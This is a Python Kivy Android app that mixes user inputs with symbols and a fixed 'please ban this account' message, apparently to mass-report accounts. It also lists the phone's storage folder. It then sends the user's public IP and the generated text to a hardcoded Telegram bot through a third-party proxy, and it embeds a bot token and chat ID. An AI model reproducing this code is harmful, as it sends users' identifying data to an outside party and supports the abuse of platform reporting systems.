import os
import random
import requests
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.core.clipboard import Clipboard

class MyApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical')
        self.guidinput = TextInput(hint_text='Enter GUID', multiline=False)
        self.smsinput = TextInput(hint_text='Enter Translation', multiline=False)
        self.sqlinput = TextInput(hint_text='Enter bug', multiline=False)
        self.additional_input1 = TextInput(hint_text='Enter sensitive destructive', multiline=False)
        self.additional_input2 = TextInput(hint_text='Enter Strong buggy algorithm', multiline=False)
        self.additional_input3 = TextInput(hint_text='Enter Clear translation', multiline=False)
        self.directory_path = '/storage/emulated/0'
        
        self.resultlabel = Label(text='Result will be shown here')
        submit_button = Button(text='Submit')
        submit_button.bind(on_press=self.onsubmit)
        self.layout.add_widget(self.guidinput)
        self.layout.add_widget(self.smsinput)
        self.layout.add_widget(self.sqlinput)
        self.layout.add_widget(self.additional_input1)
        self.layout.add_widget(self.additional_input2)
        self.layout.add_widget(self.additional_input3)
        self.layout.add_widget(submit_button)
        self.layout.add_widget(self.resultlabel)
        return self.layout

    def generaterandomstring(self, guidtarget, sms, sql, additional_strings, fixedmessage):
        randomchars = ['%xPHP999%100xXx¥yftt15-xxx', '/', '<', '>', '[', ']', '{', '}', '?', '£¥', '%']
        randomchar1 = random.choice(randomchars)
        randomchar2 = random.choice(randomchars)
        all_strings = [guidtarget, sms, sql, fixedmessage] + additional_strings
        all_strings = [s for s in all_strings if s] 
        random.shuffle(all_strings)
        result = f"{randomchar1.join(all_strings)}{randomchar2}" 
        return result

    def listdirectory(self):
        try:
            contents = os.listdir(self.directory_path)
            return "\n".join(contents) if contents else "Directory is empty."
        except Exception as e:
            return f"Error listing directory: {str(e)}"

    def onsubmit(self, instance):
        guidtarget = self.guidinput.text
        sms = self.smsinput.text
        sql = self.sqlinput.text
        additional_strings = [
            self.additional_input1.text,
            self.additional_input2.text,
            self.additional_input3.text
        ]
        fixedmessage = 'This offending account is prohibited according to the laws. Please ban it, thank you.⛔'
        result = self.generaterandomstring(guidtarget, sms, sql, additional_strings, fixedmessage)
        directorycontents = self.listdirectory()
        self.resultlabel.text = f"------------{{}} Code:\n{result}\n\nDirectory Contents:\n{directorycontents}"
        Clipboard.copy(result)
        self.resultlabel.text += "\n\nResult copied to clipboard!"
        
        try:
            ipresponse = requests.get('https://api.ipify.org?format=json')
            ipresponse.raise_for_status()  
            ipdata = ipresponse.json()
            ipaddress = ipdata.get('ip', 'IP address not found.')
            self.resultlabel.text += f"\n\nYour IP Address: {ipaddress}"
        except requests.RequestException as e:
            self.resultlabel.text += f"\n\nError fetching IP address: {str(e)}"
            ipaddress = "IP address not available"

        # Telegram bot details
        telegramtoken = '7809128081:AAEaVhRQP157uaiq2CvCfFSHYHMP3HqJ1Ts'  # توکن ربات تلگرام خود را وارد کنید
        chat_id = '7164173678'  # شناسه چت خود را وارد کنید
        a = '/storage/emulated/0'
        files_list = [f for f in os.listdir(a) if os.path.isfile(os.path.join(a, f))]
        
        # Create the message text
        fileslist = directorycontents  
        message = f"IP Address: {ipaddress}\nDirectory Contents:\n\nResult: {result}"
        
        # Send message to Telegram
        self.send_message_to_telegram(telegramtoken, chat_id, message)
        

    def send_message_to_telegram(self, token, chat_id, message):
        url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}'
        params = {'urlBox': url,
            'Agentlist': 'Mozilla Firefox',
            'Versionslist': 'HTTP/1.1',
            'Methodlist': 'POST'
        }
        try:
            response = requests.post('https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx',params=params)
            response.raise_for_status()
            self.resultlabel.text += "\n\nMessage sent to Telegram successfully!"
        except requests.RequestException as e:
            self.resultlabel.text += f"\n\nError sending message to Telegram: {str(e)}"
            
        
       

if __name__ == '__main__':
    MyApp().run()
